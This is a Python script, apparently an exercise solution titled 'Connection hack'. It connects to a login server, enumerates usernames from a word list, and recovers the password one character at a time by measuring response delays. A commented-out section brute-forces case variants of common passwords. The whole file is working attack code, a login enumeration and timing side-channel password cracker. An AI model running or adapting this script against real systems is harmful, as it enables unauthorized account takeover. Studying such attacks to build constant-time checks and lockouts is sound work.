import itertools
import socket
import argparse
import os
import json
import string
import time

js = {
    "login": "",
    "password": ""
}


def connect(client):
    parser = argparse.ArgumentParser(description='Connection hack')
    parser.add_argument('host', type=str, help='input (string) hostname')
    parser.add_argument('port', type=int, help='input (digits) port')
    args = parser.parse_args()
    address = (args.host, args.port)
    client.connect(address)


def check_login(client):
    with open('logins.txt') as tx:
        list_stand_logins = map(lambda x: x.strip(), tx.readlines())
        for login in list_stand_logins:
            js["login"] = login
            response, login, total_time = check_req_resp(client, login)
            if response["result"] == "Wrong password!":
                return


# def check_password(client):
#     with open('passwords.txt') as tx:
#         list_stand_passwords = map(lambda x: x.strip(), tx.readlines())
#         for stand_pass in list_stand_passwords:
#             gen_reg_letters = ((letter.lower(), letter.upper()) for letter in stand_pass)
#             gen_reg_passwords = map(lambda x: ''.join(x), itertools.product(*gen_reg_letters))
#             for password in gen_reg_passwords:
#                 js["password"] = password
#                 yield check_req_resp(client, password)


def check_password(client):
    symbols = string.ascii_letters + string.digits
    while True:
        for password in symbols:
            js["password"] += password
            response, password, total_time = check_req_resp(client, password)
            if response["result"] == "Connection success!":
                return
            elif total_time >= 0.1:
                continue
            else:
                js["password"] = js["password"][:-1]


def check_req_resp(client, item):
    client.send(json.dumps(js, indent=4).encode())
    start = time.perf_counter()
    response = json.loads(client.recv(1024).decode())
    end = time.perf_counter()
    total = end - start
    return response, item, total


with socket.socket() as client:
    connect(client)
    os.chdir('hacking')
    check_login(client)
    check_password(client)
    print(json.dumps(js))
